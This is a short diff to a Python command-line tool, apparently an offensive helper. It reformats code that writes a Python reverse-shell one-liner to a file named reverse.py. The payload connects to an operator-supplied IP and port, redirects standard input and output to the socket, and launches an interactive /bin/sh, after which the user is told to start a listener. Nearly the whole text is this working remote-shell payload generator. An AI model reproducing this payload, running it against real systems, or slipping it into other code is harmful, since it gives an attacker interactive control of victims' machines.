@@ -56,14 +56,17 @@ class Shells(Cmd):
         PORT = int(line)
 
         #this is the reverse script that gets written int othe file
-        output = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"""" + userIP + """\",\"""" + str(PORT) + """\"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
+        output = (
+            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""
+            + userIP + "\",\"" + str(PORT) +
+            "\"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+        )
 
         file = open("reverse.py", "w+")
         file.write(output)
         file.close()
 
         print("Script Generated !! \nRun function listen")
-
 
     # def do_exit(self, line):
     #     "Exits back to main menu"
